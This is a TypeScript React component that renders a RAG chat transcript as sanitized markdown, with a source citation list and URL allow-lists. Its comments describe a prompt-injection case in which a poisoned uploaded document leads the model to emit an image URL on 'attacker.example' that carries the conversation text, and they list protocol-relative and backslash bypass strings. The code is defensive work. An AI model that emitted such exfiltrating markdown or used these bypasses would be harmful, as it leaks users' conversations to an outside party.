import { memo } from "react";
import Markdown, { type Components } from "react-markdown";
import type { ChatSource } from "@/lib/api/messages";
import styles from "./MessageList.module.css";

/**
 * [Purpose] One transcript entry rendered by {@link MessageList}. A UI-level model, not a
 *   wire type -- distinct from `lib/api/messages.ts`'s `ChatChunk` (one SSE event) and
 *   `lib/api/conversations.ts` (conversation metadata).
 * [Caution] `streamStatus` only carries meaning for `role: "assistant"` -- a user message
 *   is always complete the moment it is sent, so it has no "streaming" state to track.
 * [Caution] `sources` carries meaning only for `role: "assistant"` and only distinguishes its
 *   values together with `streamStatus` (hybrid-rag Spec AC-21) -- `null` while
 *   `streamStatus === "streaming"` means "not yet known" (render nothing, clause ①); `null`
 *   once `streamStatus` is terminal (`"done"`/`"error"`) means "stream ended without ever
 *   receiving one" (`BL-019`, clause ③); an array (possibly empty) is the resolved value
 *   (clause ②, `AC-18`/`AC-20`); `undefined` means no stream was ever tracked for this
 *   message at all (e.g. loaded from history) and is deliberately distinct from `null` --
 *   see {@link ../chat-panel/MessageList}'s `SourceList` [Caution] for why collapsing the two
 *   is a defect, not a simplification. A caller must set this once, alongside the final
 *   `streamStatus` transition -- see {@link ../chat-panel/ChatPanel}'s `handleSend`. This same
 *   per-message field is also what makes `AC-22` (citations stay attached to the message that
 *   carried them, never bleed into a later turn) true for free -- there is no shared/global
 *   sources state to accidentally cross-contaminate.
 * [AC] hybrid-rag:AC-21, hybrid-rag:AC-22
 */
export interface ChatMessage {
  id: string;
  role: "user" | "assistant";
  content: string;
  streamStatus?: "streaming" | "done" | "error";
  sources?: ChatSource[] | null;
}

/**
 * [Purpose] Renders a conversation's messages, most recent last. An assistant message's
 *   `content` is rendered as markdown (chat:AC-37: headings/lists/fenced code blocks
 *   become real `<h*>`/`<ul>`-`<ol>`/`<pre><code>` elements, not literal `#`/`-`/```` ``` ````
 *   characters); a user message is rendered as plain text -- the user typed literal
 *   characters, so re-interpreting them as markdown would be surprising, and no AC asks
 *   for it (chat:AC-37's text is specifically about "응답", the assistant's response).
 * [Rationale] `react-markdown` builds a React element tree itself; it never uses
 *   `dangerouslySetInnerHTML`, and raw HTML in the source is escaped by default because
 *   the `rehype-raw` plugin (the only thing that would re-enable it) is never added here.
 *   That default is exactly why this card's brief names `react-markdown` as the safe
 *   choice for rendering LLM output (untrusted input, per this project's RAG design) --
 *   see dev-log for the alternatives considered. The only customization on top of its
 *   defaults is {@link markdownComponents}'s `a` override (target/rel + a scheme allow-
 *   list); headings/lists/fenced code blocks all come from `react-markdown`'s stock
 *   CommonMark handling, so no `remark-gfm` (or any other plugin) is needed for this AC
 *   and none was added, keeping the added dependency surface to `react-markdown` alone.
 * [AC] chat:AC-37
 */
export function MessageList({ messages }: { messages: ChatMessage[] }) {
  if (messages.length === 0) {
    return <p className={styles.empty}>대화를 시작해보세요.</p>;
  }

  return (
    <ul className={styles.list} aria-label="대화 내용">
      {messages.map((message) => (
        <MessageRow key={message.id} message={message} />
      ))}
    </ul>
  );
}

/**
 * [Purpose] Renders one transcript entry. Extracted out of {@link MessageList}'s `.map` and
 *   wrapped in `React.memo` so that a SSE chunk which only changes the *streaming* message's
 *   `content` does not force every other, already-`"done"`, message to re-run its markdown
 *   parse (remark -> rehype -> React tree) on each chunk.
 * [Rationale] review 2026-08-29 Medium-5: `react-markdown`'s own `Markdown` export is not
 *   itself wrapped in `React.memo` (confirmed against `node_modules/react-markdown/lib/
 *   index.js`), so without a memo boundary here, `MessageList`'s parent `setMessages` call on
 *   every chunk creates a new messages array, `.map` creates a new element for every row
 *   regardless of whether that row's own data changed, and every row's `<Markdown>` re-parses
 *   its (unchanged) content from scratch. The custom comparator checks exactly the fields this
 *   component reads (`id`, `role`, `content`, `streamStatus`) rather than relying on default
 *   shallow-prop-equality, because the `message` object itself is a new reference on every
 *   parent render regardless of memo.
 *   Deliberately *not* addressed here: the currently-streaming message's own repeated
 *   re-parsing as its content grows chunk-by-chunk. At this project's observed scale (chunks
 *   in the low tens, replies up to ~1750 chars, conversations up to ~6 messages -- review
 *   2026-08-29 Medium-5), that remaining re-parse work is bounded and was judged not worth a
 *   debounce or incremental-parse mechanism; only cross-message re-render waste is fixed here.
 */
const MessageRow = memo(function MessageRow({ message }: { message: ChatMessage }) {
  return (
    <li className={message.role === "user" ? styles.userRow : styles.assistantRow}>
      {/* Role is announced as text, not only via position/color (accessibility
          default: color/layout alone must not carry information). */}
      <span className={styles.roleLabel}>{message.role === "user" ? "나" : "어시스턴트"}</span>
      {message.role === "assistant" ? (
        <>
          <div
            className={styles.markdown}
            // A live region so a streaming reply's incremental growth is announced to
            // screen readers too, not only visible sighted users.
            role="status"
            aria-live="polite"
            aria-busy={message.streamStatus === "streaming"}
            data-testid={`message-${message.id}`}
          >
            <Markdown components={markdownComponents}>{message.content}</Markdown>
          </div>
          <SourceList sources={message.sources} streamStatus={message.streamStatus} />
        </>
      ) : (
        <p className={styles.plainText} data-testid={`message-${message.id}`}>
          {message.content}
        </p>
      )}
    </li>
  );
}, areMessagePropsEqual);

function areMessagePropsEqual(
  prev: { message: ChatMessage },
  next: { message: ChatMessage },
): boolean {
  return (
    prev.message.id === next.message.id &&
    prev.message.role === next.message.role &&
    prev.message.content === next.message.content &&
    prev.message.streamStatus === next.message.streamStatus &&
    prev.message.sources === next.message.sources
  );
}

/**
 * [Purpose] Renders the citation area under an assistant reply -- hybrid-rag Spec `AC-18`
 *   (1+ sources), `AC-20` (confirmed-empty sources), and `AC-21`'s three-clause state model
 *   (streaming / resolved / stream-ended-but-never-resolved).
 * [Rationale] `streamStatus` and `sources` are read together, not `sources` alone, because
 *   `sources === null` is ambiguous on its own -- it means "not yet known" while streaming
 *   (clause ①, render nothing) and "never arrived" once the stream has ended (clause ③,
 *   `BL-019`). Clause ③'s box is deliberately a different visual treatment (solid
 *   `--app-status-danger` border, not `AC-20`'s dashed `--app-line-strong`) so a delivery
 *   failure is never mistaken for a confirmed "no evidence" answer (Spec AC-21 ③'s explicit
 *   "AC-20 과 동일한 구조를 재사용하지 않는다"); the prototype has no reference screen for this
 *   state (it is a wire-defect case, not a design one), so the icon/border choice here is this
 *   card's own, not a ported value.
 * [Caution] `sources === undefined` (distinct from `null`) is a fourth case AC-21's three
 *   clauses do not cover: a message this component never tracked a stream for at all --
 *   today, only `ChatWorkspace`'s history load (`toChatMessages`), which does not thread the
 *   backend's `MessageResponse.sources` through yet (Spec §2 "과거 대화 이력 재조회 화면의 출처
 *   표시" is explicitly out of scope for this card). Collapsing that into `null` would render
 *   clause ③'s "출처를 불러오지 못했습니다." on every historical reply, falsely implying a
 *   delivery failure that never happened (review 2026-08-31 High-1) -- so this case renders
 *   nothing instead, same as clause ①. A live-streamed message never hits this branch:
 *   {@link ../chat-panel/ChatPanel} sets `sources: null` explicitly the moment it creates the
 *   message, before the stream starts.
 * [Caution] `filename` reaches the wire unescaped (Spec T15 security Low-1) -- rendered only
 *   via JSX text interpolation below, never `dangerouslySetInnerHTML`. `sources` itself is
 *   also not trusted to actually be an array (review 2026-08-31 security Low-1) -- a malformed
 *   payload falls back to the clause ③ screen rather than throwing mid-render.
 * [AC] hybrid-rag:AC-18, hybrid-rag:AC-19, hybrid-rag:AC-20, hybrid-rag:AC-21
 */
function SourceList({
  sources,
  streamStatus,
}: {
  sources: ChatSource[] | null | undefined;
  streamStatus: ChatMessage["streamStatus"];
}) {
  if (streamStatus === "streaming" || streamStatus === undefined) {
    return null; // AC-21 clause (1): stream not yet ended -- nothing to show.
  }

  if (sources === undefined) {
    return null; // No stream was ever tracked for this message (e.g. loaded from history).
  }

  if (!isValidSourceList(sources)) {
    // Covers `null` (clause (3), BL-019: stream ended, sources never arrived), any non-array
    // value, and an array containing a malformed element (review 2026-08-31 round-2 security
    // Low-1: a single bad element, e.g. `[null]`, must not crash `formatSourceLabel` mid-map --
    // rejecting the whole value here keeps AC-18's "rendered count matches sources.length"
    // guarantee intact for well-formed data instead of silently dropping just the bad element).
    return (
      <div className={styles.sourcesFailed}>
        <span aria-hidden="true">⚠</span> 출처를 불러오지 못했습니다.
      </div>
    );
  }

  return (
    <div className={styles.sources}>
      <div className={styles.sourcesHeader}>
        <span className={styles.sourcesLabel}>출처</span>
        <span className={styles.sourcesCount}>{sources.length}건</span>
      </div>
      {sources.length === 0 ? (
        <div className={styles.sourcesEmpty}>
          <span aria-hidden="true">✕</span> 이 답변에는 근거 문서가 없습니다.
        </div>
      ) : (
        <ul className={styles.sourceItems}>
          {sources.map((source, index) => (
            // Keyed on more than `documentId` alone: the backend maps one Source per
            // *retrieved chunk*, not per document (`ChatService#resolveSources`), so two
            // sources from the same document (different pages) are a normal result and would
            // otherwise collide (review 2026-08-31 Medium-2).
            <li key={`${source.documentId}-${source.page ?? "na"}-${index}`} className={styles.sourceItem}>
              {formatSourceLabel(source)}
            </li>
          ))}
        </ul>
      )}
    </div>
  );
}

/** "<filename> p.<page>" when `page` is present, "<filename>" alone otherwise (hybrid-rag
 *  Spec AC-19, §7 Q2's confirmed display rule -- not a new decision made here). */
function formatSourceLabel(source: ChatSource): string {
  return source.page !== null ? `${source.filename} p.${source.page}` : source.filename;
}

/** True only for an array whose every element has at least the shape `formatSourceLabel` and
 *  the `<li>` key builder above actually read (`filename`, `page`, `documentId`) -- guards
 *  against a wire-contract violation like `sources: [null]` reaching `.map` (review 2026-08-31
 *  round-2 security Low-1). */
function isValidSourceList(sources: unknown): sources is ChatSource[] {
  return (
    Array.isArray(sources) &&
    sources.every(
      (s) =>
        typeof s === "object" &&
        s !== null &&
        typeof (s as ChatSource).filename === "string" &&
        typeof (s as ChatSource).documentId === "string" &&
        ((s as ChatSource).page === null || typeof (s as ChatSource).page === "number"),
    )
  );
}

/**
 * [Purpose] The two overrides on top of react-markdown's safe defaults: (1) adds
 *   `target="_blank" rel="noopener noreferrer"` to rendered links (react-markdown does not
 *   do this on its own) and refuses to render a non-http(s)/mailto/in-page `href` as a
 *   clickable link at all; (2) refuses to render a markdown image (`![alt](src)`) as a live
 *   `<img>` unless its `src` is same-origin-relative, falling back to the alt text instead.
 *   ({@link isSafeImageSrc} also allow-lists `data:` -- see its own [Caution] for why that
 *   branch does not currently change this component's actual rendered output.)
 * [Rationale] `react-markdown`'s own default `urlTransform` already strips dangerous
 *   protocols from `href`/`src` (allow-list: http, https, irc, ircs, mailto, xmpp, and
 *   relative URLs -- see its README's "Security"/`defaultUrlTransform` sections), so
 *   {@link isSafeHref}/{@link isSafeImageSrc} here are defense in depth, not the only
 *   guard: even if a future dependency bump ever changed that default, a `javascript:`
 *   href is still rendered as inert text, and an `http(s)` image `src` is still rendered
 *   as inert alt text, never as a live element.
 *   The `img` override exists specifically because `urlTransform` allows `http`/`https`
 *   for images (review 2026-08-29 High-2): an assistant message is LLM output driven by
 *   the RAG corpus, and `POST /api/admin/documents` (see High-1 note above) accepts
 *   uploads without authentication, so a poisoned document could prompt-inject the model
 *   into emitting `![x](https://attacker.example/p.png?q=<conversation text>)`. Unlike a
 *   link, an `<img>` fires its GET the instant it renders -- no click needed -- so this is
 *   an exfiltration channel, not just a navigation risk, and is closed at the component
 *   level (belt) with a matching CSP `img-src` (suspenders, see `next.config.ts`).
 *   {@link isSafeImageSrc} is a separate function from {@link isSafeHref} rather than a
 *   shared helper because their allow-lists are legitimately different: a link may
 *   usefully point at any http(s) URL or `mailto:` (the user must still click it), but an
 *   image allow-list that included `http(s)` would defeat the very protection this
 *   override exists for.
 * [Caution] Do not add `rehype-raw` or pass raw HTML through `dangerouslySetInnerHTML`
 *   anywhere in this tree -- `message.content` for an assistant message is LLM output,
 *   untrusted input in this project's RAG design (card F2 brief).
 * [AC] chat:AC-37
 */
const markdownComponents: Components = {
  a({ href, children }) {
    if (!href || !isSafeHref(href)) {
      return <span>{children}</span>;
    }
    return (
      <a href={href} target="_blank" rel="noopener noreferrer">
        {children}
      </a>
    );
  },
  img({ src, alt }) {
    // `src`'s type includes React 19's experimental non-string `img` source values (e.g.
    // `Blob`) alongside `string | undefined` -- markdown/`react-markdown` only ever produces
    // a string URL here, so anything else is treated the same as "missing/unsafe".
    if (typeof src !== "string" || !isSafeImageSrc(src)) {
      return <span>{alt ?? ""}</span>;
    }
    // `src` here is an arbitrary, untrusted markdown URL (gated by isSafeImageSrc above);
    // next/image's static domain allow-list config does not fit a value that is only
    // known at render time.
    // eslint-disable-next-line @next/next/no-img-element
    return <img src={src} alt={alt ?? ""} />;
  },
};

/**
 * [Purpose] Link `href` allow-list: same-origin-relative paths, in-page anchors,
 *   `https?:`, and `mailto:`.
 * [Rationale] review 2026-08-29 Low-2: the previous regex's bare `\/` alternative also
 *   matched protocol-relative URLs (`//attacker.example/x`, which browsers resolve using
 *   the *current* scheme against a *different* host) because they too start with a single
 *   `/` character. The negative lookahead `/^\/(?!\/)/` fixed that one shape but review
 *   2026-08-29 Medium-1 (later withdrawn -- see {@link isSameOriginRelative}'s [Caution])
 *   raised two more shapes a regex can't see: (1) in the URL/WHATWG parser, `\` is treated
 *   the same as `/` for special schemes, so `/\attacker.example/p.png` would be
 *   host-override-equivalent to `//attacker.example/p.png` and the lookahead would never
 *   trigger because the second character isn't literally `/`; (2) the parser strips ASCII
 *   TAB/CR/LF from anywhere in the URL before resolving it, while `.trim()` only trims the
 *   two ends, so a CommonMark `<...>`-delimited destination carrying an embedded TAB (e.g.
 *   `</\t/attacker.example/p.png>`) would also slip past -- *if* either reached this
 *   function in that unnormalized form, which they do not in the shipped pipeline (see
 *   {@link isSameOriginRelative}'s [Caution]). Delegating to {@link isSameOriginRelative}
 *   fixes both anyway: it resolves the candidate with the same WHATWG `URL` parser the
 *   browser itself uses and compares the resulting *origin*, so it inherits the browser's
 *   own `\`-as-`/` and control-character handling instead of trying to out-guess them with
 *   a second regex -- this stays correct as defense in depth even though the two shapes
 *   above are not reachable today.
 * [Caution] Keep this in sync with {@link isSafeImageSrc} only where the two genuinely
 *   overlap (the relative-path check, both delegate to {@link isSameOriginRelative}); do
 *   not merge their http(s) handling -- see the [Rationale] on {@link markdownComponents}
 *   for why they differ there.
 */
function isSafeHref(href: string): boolean {
  const trimmed = href.trim();
  return /^(https?:|mailto:|#)/i.test(trimmed) || isSameOriginRelative(trimmed);
}

/**
 * [Purpose] Image `src` allow-list: same-origin-relative paths (delegates to
 *   {@link isSameOriginRelative}, shared with {@link isSafeHref} -- see its [Rationale] for
 *   why a parser is used instead of a regex) and `data:` URIs. Deliberately excludes
 *   `https?:` and `mailto:`.
 * [Rationale] AC chat:AC-37's markdown rendering exists to display assistant text, not to
 *   fetch third-party resources. An `<img>` loads unconditionally on render (no user
 *   click), so allowing arbitrary `http(s)` here -- as {@link isSafeHref} does for links --
 *   would reopen exactly the exfiltration channel this override exists to close (see
 *   review 2026-08-29 High-2, and the [Rationale] on {@link markdownComponents}).
 * [Caution] The `data:` branch is currently unreachable via markdown image syntax
 *   (`![alt](src)`) in the shipped `react-markdown@10.1.0`: its own `defaultUrlTransform`
 *   (`safeProtocol` regex in `node_modules/react-markdown/lib/index.js`, allow-listing only
 *   `https?`/`ircs?`/`mailto`/`xmpp`) rewrites a `data:` URI to `""` *before*
 *   {@link markdownComponents}'s `img` override -- and therefore this function -- ever sees
 *   it; confirmed against that source and by `MessageList.test.tsx`'s "falls back to alt
 *   text for a data: URI markdown image" case (QA, review 2026-08-29 defect 2). This is not
 *   a bug -- an unreachable branch here is strictly more restrictive than the alternative,
 *   never less -- and the branch is kept rather than deleted as defense in depth against
 *   `react-markdown` changing `defaultUrlTransform`'s allow-list in a future version (at
 *   which point this function, not react-markdown's default, would become the only guard
 *   standing between a `data:` image and this app rendering it live). Do not describe this
 *   branch elsewhere as currently affecting rendered output -- it does not.
 */
function isSafeImageSrc(src: string): boolean {
  const trimmed = src.trim();
  return /^data:/i.test(trimmed) || isSameOriginRelative(trimmed);
}

/**
 * [Purpose] True when `candidate`, resolved as a URL, lands on the same origin as this
 *   app -- the shared same-origin test behind both {@link isSafeHref} and
 *   {@link isSafeImageSrc}'s relative-path branch.
 * [Rationale] review 2026-08-29 Medium-1 (later withdrawn -- see [Caution] below): a regex
 *   trying to recognize "starts with exactly one `/`" cannot see the WHATWG URL parser's
 *   own normalization (`\` folded to `/` for special schemes, ASCII TAB/CR/LF stripped from
 *   anywhere in the string) -- see the [Rationale] on {@link isSafeHref} for the three
 *   concrete bypass strings this would close if they ever reached this function in
 *   unnormalized form. Resolving `candidate` against a fixed, non-existent placeholder base
 *   (`http://x.invalid`) and comparing `origin` reuses the exact parser the browser itself
 *   applies before navigating/fetching, so this function can only be as wrong as the
 *   browser is, instead of a second, independent (and in this case looser) guess at the
 *   same rules. An absolute `http(s)://other-host/...` candidate correctly resolves to a
 *   different origin and is rejected here -- callers that want to allow `http(s)` do so via
 *   their own separate branch (see {@link isSafeHref}), not through this function.
 * [Caution] The placeholder base's scheme/host/port are arbitrary and never dereferenced --
 *   only used as the resolution anchor for relative candidates -- so they must stay fixed
 *   for the two `origin` values being compared to be meaningful. An empty `candidate` is
 *   rejected explicitly before resolution: `new URL("", placeholderBase)` resolves to the
 *   placeholder base itself, same origin by construction, which would otherwise make an
 *   empty `src`/`href` pass as "safe" -- react-markdown's own `defaultUrlTransform` rewrites
 *   a disallowed protocol (e.g. `data:` for an image) to exactly `""` rather than omitting
 *   the attribute, and `MessageList.test.tsx`'s data-URI case exercises this path directly.
 *
 *   As of today, in the shipped `react-markdown@10.1.0` pipeline, the three bypass strings
 *   named in this function's own [Rationale] and in {@link isSafeHref}'s [Rationale] do not
 *   reach this function in the unnormalized form those write-ups describe:
 *   `mdast-util-to-hast`'s `link`/`image` handlers run every destination through
 *   `micromark-util-sanitize-uri`'s `normalizeUri()` first, which percent-encodes `\`
 *   (0x5C) to `%5C` and TAB (0x09) to `%09` before this function ever sees the value. A
 *   percent-encoded `%5C`/`%09` is not treated as a path/host separator by the WHATWG `URL`
 *   parser, so both the old regex-based guard and this function already agree the encoded
 *   form is same-origin -- there is no live bypass to close today (coordinator-verified,
 *   `INC-016`). This function is kept anyway as defense in depth for if/when the upstream
 *   `normalizeUri` policy changes; do not describe it elsewhere as currently closing a
 *   reachable bypass -- it does not (compare {@link isSafeImageSrc}'s `data:` branch
 *   [Caution], which makes the same unreachable-but-kept argument for the same reason).
 */
function isSameOriginRelative(candidate: string): boolean {
  if (candidate.length === 0) return false;
  const placeholderBase = "http://x.invalid";
  try {
    return new URL(candidate, placeholderBase).origin === placeholderBase;
  } catch {
    return false;
  }
}
